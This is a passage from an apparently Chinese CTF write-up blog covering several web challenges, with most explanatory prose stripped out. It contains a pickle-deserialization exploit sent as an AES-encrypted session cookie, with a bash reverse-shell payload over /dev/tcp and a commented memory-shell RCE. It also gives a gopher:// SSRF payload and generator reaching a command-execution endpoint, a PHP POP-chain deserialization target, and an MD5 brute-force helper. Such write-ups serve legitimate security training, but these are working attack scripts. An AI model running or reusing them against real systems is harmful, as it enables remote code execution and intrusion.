requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">data, key, iv</span>):</span><br><span class="line"></span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv),</span><br><span class="line">                    backend=default_backend())</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line"></span><br><span class="line">    padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">    padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">    result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(result).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;ajwdopldwjdowpajdmslkmwjrfhgnbbv&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;asdwdggiouewhgpw&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;cat /flag* &gt; /app/app.py&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickled_data = base64.b64encode(data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># class RCE():</span></span><br><span class="line"><span class="comment">#     def __reduce__(self):</span></span><br><span class="line"><span class="comment">#         return (exec, (&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;,))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pickled_data = base64.b64encode(pickle.dumps(RCE())).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"></span><br><span class="line">session = aes_encrypt(pickled_data, key, iv)</span><br><span class="line">url = <span class="string">&#x27;http://node6.anna.nssctf.cn:24514/&#x27;</span></span><br><span class="line">res = requests.post(url, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: session&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="comment"># http://node6.anna.nssctf.cn:24514/xxx?cmd=ls /</span></span><br></pre></td></tr></table></figure><p><code>wp</code><a href="https://blog.csdn.net/2301_79724395/article/details/139094906"></a></p><h2 id="goph3rrr"><a class="markdownIt-Anchor" href="#goph3rrr"></a> Goph3rrr</h2><p><strong></strong><code>/app.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunparse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">BlackList = [</span><br><span class="line">    <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27; ... &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username][<span class="string">&#x27;password&#x27;</span>] == hashlib.md5(password.encode()).hexdigest():</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">f&quot;Welcome back, <span class="subst">&#123;username&#125;</span>!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;Invalid credentials!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Gopher&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No url provided :)&quot;</span></span><br><span class="line">    url = urlparse(url)</span><br><span class="line">    realIpAddress = socket.gethostbyname(url.hostname)</span><br><span class="line">    <span class="keyword">if</span> url.scheme == <span class="string">&quot;file&quot;</span> <span class="keyword">or</span> realIpAddress <span class="keyword">in</span> BlackList:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No ()&quot;</span></span><br><span class="line">    result = subprocess.run([<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-L&quot;</span>, urlunparse(url)], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> result.stdout</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/RRegister&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;Username already exists!&quot;</span>)</span><br><span class="line">        users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: hashlib.md5(password.encode()).hexdigest()&#125;</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;Registration successful!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Manage&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>():</span><br><span class="line">    <span class="keyword">if</span> request.remote_addr != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden!!!&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Allowed!!!&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> os.popen(request.form.get(<span class="string">&quot;cmd&quot;</span>)).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_avatar</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;User not found!&quot;</span>)</span><br><span class="line">        file = request.files.get(<span class="string">&#x27;avatar&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> file:</span><br><span class="line">            file.save(os.path.join(avatar_dir, <span class="string">f&quot;<span class="subst">&#123;username&#125;</span>.png&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;Avatar uploaded successfully!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;No file uploaded!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app.py&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>Gop<strong>her</strong><strong>Manage</strong><strong>Gopher</strong><strong>file://</strong><strong>Manage</strong><strong></strong><code>os.popen(request.form.get(&quot;cmd&quot;)).read()</code></p><p><strong>Gopher</strong><strong></strong><strong>Gopher</strong><strong>SSRF</strong><strong>Manage</strong><strong></strong></p><p><strong>gopher://</strong><strong>SSRF</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gopherhttpgopher FTPTelnetRedisMemcache GETPOST </span><br><span class="line"></span><br><span class="line">SSRFHTTPPOSTgopherPOST</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_TCP</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;_&quot;</span><span class="string">&quot;_&quot;</span>TCP<span class="string">&quot;_&quot;</span></span><br></pre></td></tr></table></figure><p><strong>Gopher</strong><strong></strong><strong>127.0.0.1</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>(<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>) <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> </span><br><span class="line"><span class="number">127.</span>x.x.x <span class="number">.1</span></span><br></pre></td></tr></table></figure><p><strong>Manage</strong><strong>POST</strong><strong></strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /Manage HTTP/1.1</span><br><span class="line">host:127.0.0.1</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:7</span><br><span class="line"></span><br><span class="line">cmd=<span class="built_in">env</span></span><br></pre></td></tr></table></figure><p><code>result = subprocess.run([&quot;curl&quot;, &quot;-L&quot;, urlunparse(url)], capture_output=True, text=True)</code><strong>URL</strong>(<strong>gopher</strong>)<strong>8000</strong></p><p><code>payload</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/Gopher?url=gopher://0.0.0.0:8000/_POST%2520%252FManage%2520HTTP%252F1.1%250Ahost%253A127.0.0.1%250AContent-Type%253Aapplication%252Fx-www-form-urlencoded%250AContent-Length%253A7%250A%250Acmd%253Denv</span><br></pre></td></tr></table></figure><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;cmd=ls /&quot;</span></span><br><span class="line">payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_to_gopher</span>(<span class="params">http_request: <span class="built_in">str</span>, host: <span class="built_in">str</span>, port: <span class="built_in">int</span> = <span class="number">80</span></span>):</span><br><span class="line">    lines = http_request.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    request_line = lines[<span class="number">0</span>].split()</span><br><span class="line">    method = request_line[<span class="number">0</span>]</span><br><span class="line">    path = request_line[<span class="number">1</span>]</span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    body = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">1</span>:]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line.strip():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            key, value = line.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line">            headers[key.strip()] = value.strip()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            body = line.strip()</span><br><span class="line"></span><br><span class="line">    gopher_payload = <span class="string">f&quot;<span class="subst">&#123;method&#125;</span> <span class="subst">&#123;path&#125;</span> HTTP/1.1\r\n&quot;</span></span><br><span class="line">    gopher_payload += <span class="string">f&quot;Host: <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> headers.items():</span><br><span class="line">        gopher_payload += <span class="string">f&quot;<span class="subst">&#123;key&#125;</span>: <span class="subst">&#123;value&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> body:</span><br><span class="line">        gopher_payload += <span class="string">f&quot;\r\n<span class="subst">&#123;body&#125;</span>&quot;</span></span><br><span class="line">    gopher_payload += <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    double_encoded_payload = urllib.parse.quote(urllib.parse.quote(gopher_payload))</span><br><span class="line">    gopher_url = <span class="string">f&quot;gopher://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/_<span class="subst">&#123;double_encoded_payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> gopher_url</span><br><span class="line"></span><br><span class="line">http_request = <span class="string">f&quot;&quot;&quot;POST /Manage HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 0.0.0.0:8000</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;payload_len&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;payload&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(http_to_gopher(http_request, <span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br></pre></td></tr></table></figure><h2 id="popppppp"><a class="markdownIt-Anchor" href="#popppppp"></a> Popppppp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forbidden</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit3 = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The time spent with xxx is my happiest time&quot;</span> . <span class="variable language_">$this</span>-&gt;fruit9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span> . <span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenVar</span> = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hiddenVar = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hiddenVar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dummyVar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessFour</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lalala</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hehe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PHPpop</strong><br /></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct </span><br><span class="line">__destruct  </span><br><span class="line">__toString  <span class="keyword">echo</span><span class="keyword">print</span><span class="title function_ invoke__">__toString</span>()</span><br><span class="line">__get   </span><br><span class="line">__call  PHP<span class="title function_ invoke__">__call</span>()</span><br><span class="line"><span class="title function_ invoke__">__set</span>(<span class="variable">$property</span>, <span class="variable">$value</span>)  (<span class="keyword">private</span>)</span><br><span class="line">__invoke    </span><br></pre></td></tr></table></figure><p><strong></strong><code>new $day2($day1)</code><strong>foreach()</strong><a href="https://www.anquanke.com/post/id/284901">DirectoryIterator</a><strong></strong><strong>SplFileObject</strong></p><p><strong></strong><code>__get()</code><strong>Philosopher</strong><strong>hey</strong><strong></strong><code>__invoke()</code><strong>return xxx();</strong><code>CherryBlossom</code></p><p>pop<strong>CherryBlossom:__destruct()-&gt;CherryBlossom::__toString()-&gt;Philosopher::__invoke()-&gt;Mystery::__get()</strong></p><p><a href="https://www.cnblogs.com/-mo-/p/11582424.html">MD5</a><strong>php</strong>11e3311<code>py2</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        value1 = hashlib.md5(rnds.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value1[start: start+str_len] == substr:</span><br><span class="line">            <span class="comment"># print(rnds)</span></span><br><span class="line">            <span class="comment"># stop_event.set()</span></span><br><span class="line">            <span class="comment"># md5</span></span><br><span class="line">            value2 = hashlib.md5(value1.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> value2[start: start+str_len] == substr:</span><br><span class="line">                <span class="built_in">print</span>(rnds + <span class="string">&quot;=&gt;&quot;</span> + value1 + <span class="string">&quot;=&gt;&quot;</span> + value2 + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                stop_event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = <span class="string">&#x27;666&#x27;</span></span><br><span class="line">    start_pos = 